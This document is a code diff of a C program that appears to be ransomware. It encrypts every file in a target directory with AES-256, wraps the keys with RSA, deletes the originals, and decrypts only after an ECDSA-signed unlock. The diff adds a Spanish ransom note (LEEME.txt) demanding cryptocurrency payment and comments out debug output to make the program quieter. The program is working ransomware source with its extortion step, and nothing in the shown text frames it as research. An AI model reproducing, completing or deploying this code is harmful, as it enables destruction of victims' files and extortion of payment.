@@ -132,9 +132,9 @@ int verifyWithECDSA(const char *clave_publica, const char *ruta_archivo, const c
     int verificacion = ECDSA_do_verify(hash, SHA256_DIGEST_LENGTH, firma, publicKey);
 
     if (verificacion == 1) {
-        printf("Verificación exitosa\n");
+        //printf("Verificación exitosa\n");
     } else {
-        printf("Verificación fallida\n");
+        //printf("Verificación fallida\n");
     }
 
     free(data);
@@ -143,74 +143,6 @@ int verifyWithECDSA(const char *clave_publica, const char *ruta_archivo, const c
 
     return verificacion;
 }
-
-/*int verifyWithECDSA(const char *public_key_path, const char *file_path, const char *signature_path) {
-    int ret = 1;
-
-    // Leer la clave pública
-
-    EC_KEY *public_key = loadEcdsaPublicKeyFromPEM(clavePublicaFirma);
-    if (!public_key)
-        handleErrors();
-
-    // Leer el archivo a verificar
-    FILE *file = fopen(file_path, "rb");
-    if (!file)
-        handleErrors();
-
-    fseek(file, 0L, SEEK_END); // Puntero a final archivo
-
-    long file_size = ftell(file); // Determina el tamaño del archivo
-
-    rewind(file); // Puntero vuelve a inicio del archivo
-
-    unsigned char *data = malloc(file_size); // Asigna memoria para almacenar el contenido del archivo
-    if (!data)
-        handleErrors();
-
-    fread(data, 1, file_size, file);
-    fclose(file);
-
-    // Leer la firma a verificar
-    FILE *signature_file = fopen(signature_path, "rb");
-    if (!signature_file)
-        handleErrors();
-
-    fseek(signature_file, 0L, SEEK_END); // Puntero a final archivo
-
-    long signature_size = ftell(signature_file); // Determina el tamaño de la firma
-
-    rewind(signature_file); // Puntero vuelve a inicio del archivo
-
-    unsigned char *signature_data = malloc(signature_size); // Asigna memoria para almacenar la firma
-    if (!signature_data)
-        handleErrors();
-
-    fread(signature_data, 1, signature_size, signature_file);
-    fclose(signature_file);
-
-    // Verificar la firma
-    ECDSA_SIG *signature = d2i_ECDSA_SIG(NULL, (const unsigned char**)&signature_data, signature_size);
-    if (!signature)
-        handleErrors();
-
-    if (ECDSA_do_verify(data, file_size, signature, public_key) != 1) {
-        fprintf(stderr, "Error al verificar la firma\n");
-        ERR_print_errors_fp(stderr); // Imprimir detalles del error
-        ret = 0; // La verificación falló
-    } else {
-        ret = 1;
-        printf("La firma es válida.\n");
-        return ret;
-    }
-    // Liberar recursos
-    ECDSA_SIG_free(signature);
-    EC_KEY_free(public_key);
-    free(data);
-    free(signature_data);
-
-    return ret;
-}*/
 
 RSA *parseRSAPublicKeyFromPEMString(const char *pemKey) {
     BIO *bio = BIO_new_mem_buf((void *)pemKey, -1);  // -1 para que BIO determine la longitud automáticamente
@@ -359,6 +291,9 @@ int main()
     const char *firma = "C:\\Users\\usuario\\Desktop\\firma_ecdsa.txt";
     const char *PrivateKey = "C:\\Users\\usuario\\Desktop\\clave_privada_rsa.pem";
 
+    //archivo LEEME//
+    const char *LEEME = "C:\\Users\\usuario\\Desktop\\LEEME.txt";
+
     if ((File = readdir(Victim)) != NULL){
     int Envirao = mkdir(Encriptado);
     int Secreto = mkdir(Clave);
@@ -370,7 +305,7 @@ int main()
     {   
         
         if (strcmp(File->d_name, ".") != 0 && strcmp(File->d_name, "..") != 0) {
-            printf("Nombre del archivo: %s\n", File->d_name);
+            //printf("Nombre del archivo: %s\n", File->d_name);
 
           LPCSTR extension = PathFindExtensionA(File->d_name);
 
@@ -379,7 +314,7 @@ int main()
             if(_stricmp(extension, ".crf") != 0){
                 char inputFileName[1024];
                 PathCombineA(inputFileName, Target, File->d_name);
-                printf("Ruta del archivo: %s\n", inputFileName);
+                //printf("Ruta del archivo: %s\n", inputFileName);
                 FILE *inputFile = fopen(inputFileName, "rb");
                 const char *enc = ".crf";
                 char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
@@ -390,7 +325,7 @@ int main()
 
                 // Comprobamos la correcta apertura de los ficheros //
                 if(inputFile && outputFile){
-                    printf("se abren bien los archivos");
+                    //printf("se abren bien los archivos");
                     // Creamos el contexto
                     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
                     EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL);
@@ -424,7 +359,7 @@ int main()
                     encryptWithPublicKey(keyFileName,EnckeyFileName,rsa);
                     encryptWithPublicKey(ivFileName,EncivFileName,rsa);
                     RSA_free(rsa);
-                    
+
                     remove(inputFileName);
                     rmdir(Target);
 
@@ -433,6 +368,20 @@ int main()
                 }
             }
         } 
+    }
+    const char *mensajeLeeme = "Si quieres volver a ver tus datos:\n"
+                                               "1. Paga en la siguiente wallet con criptomonedas [wallet]\n"
+                                               "2. Se te hará llegar un archivo de firma y un archivo con una clave NO LOS TOQUES\n"
+                                               "3. Deja ambos archivos en el escritorio\n"
+                                               "4. Vuelve a abrir la imágen.";
+    FILE *leemeFile = fopen(LEEME, "w");
+
+    if (leemeFile) {
+        fprintf(leemeFile, "%s", mensajeLeeme);
+        fclose(leemeFile);
+        //printf("Texto personalizado agregado a LEEME.txt\n");
+    } else {
+        printf("Error al abrir LEEME.txt para escribir\n");
     }
     }else {
         if (verifyWithECDSA(clavePublicaFirma, PrivateKey, firma)) {
@@ -454,7 +403,7 @@ int main()
             // Comprobamos si está encriptado o no el archivo //
             // Desencriptamos //
             if(_stricmp(extension, ".crf") == 0){
-                printf("La extensión es .crf \n");
+                //printf("La extensión es .crf \n");
                 // Lee la clave y la extrae//
                 FILE *keyFile = fopen(keyFileName, "rb");
                 fread(key, 1, sizeof(key), keyFile);
@@ -480,7 +429,7 @@ int main()
                 }
                 FILE *outputFile = fopen(outputFileName, "wb"); // Abrir el archivo de salida
                 if(inputFile && outputFile){
-                    printf("input y output fino \n");
+                    //printf("input y output fino \n");
                     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
                     EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL);
                     EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv);
@@ -527,6 +476,8 @@ int main()
         remove(keyFileName);
         remove(ivFileName);
         remove(PrivateKey);
+        remove(firma);
+        remove(LEEME);
         } else {
             printf("Firma incorrecta");
         }
